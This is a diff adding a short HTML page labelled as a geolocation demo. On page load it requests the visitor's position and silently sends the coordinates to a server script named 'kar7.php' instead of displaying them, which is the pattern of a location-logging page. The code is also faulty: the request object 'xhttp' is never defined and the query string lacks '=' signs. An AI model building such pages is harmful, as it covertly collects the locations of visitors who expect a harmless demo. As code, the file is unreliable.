@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()" >
+<h1>HTML Geolocation</h1>
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    xhttp.open("GET", "kar7.php?lat"+position.coords.latitude +"&long" + position.coords.longitude);
+    xhttp.send();
+
+}
+</script>
+
+</body>
+</html>
